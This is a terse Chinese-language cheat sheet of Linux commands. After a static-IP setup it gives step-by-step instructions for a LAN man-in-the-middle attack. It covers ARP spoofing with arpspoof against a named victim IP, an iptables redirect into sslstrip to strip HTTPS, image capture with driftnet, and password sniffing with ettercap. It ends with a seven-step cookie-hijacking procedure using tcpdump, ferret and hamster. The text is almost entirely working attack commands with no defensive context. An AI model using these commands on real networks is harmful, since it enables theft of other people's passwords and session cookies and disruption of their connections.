局域网配置方法
第一步：vi /etc/network/interfaces
第二步：配置ip
auto eth0
#iface eth0 inet dhcp
iface eth0 inet static #dynamic
address 192.168.1.122
netmask 255.255.255.0
network 192.168.1.0
broadcast 192.168.1.255
gateway 192.168.1.1
第三步：/etc/init.d/networking restart
第四步：update-rc.d networking defaults


（配置文件：vim /etc/ettercap/etter.conf 删除Linux最后两段前的#号//用于https）




开启IP流量转发
echo 1 > /proc/sys/net/ipv4/ip_forward
//默认是0



断网攻击
arpspoof -i 网卡 -t 受害者IP 网关IP


过滤数据包：
iptables -t nat -A PREROUTING -p tcp -i eth0 --destination-port 80 -j REDIRECT --to-port 10000
//转发到10000端口

ssl扒皮：
sslstrip -a -f -k 或 sslstrip -l 10000

//10000是因为上面设置为10000 用于https



抓取图片
driftnet -i eth0

开始嗅探账号密码：
ettercap -Tq -i 网卡



cookie劫持
第一步：开启IP转发：echo 1 > /proc/sys/net/ipv4/ip_forward
第二步：ARP欺骗： arpspoof -i 网卡 -t 网关IP 受害者IP
第三步：抓包：wireshark 或者 tcpdump -i eth0 -w cookie.cap
第四步：等待受害人登陆


第五步：处理抓取的数据包：ferret -r cookie.cap
第六步：开启hamster服务：hamster
第七步：设置代理：127.0.0.1:1234

或
第五步：ferret -i eth0
第六步：设置代理：127.0.0.1:1234
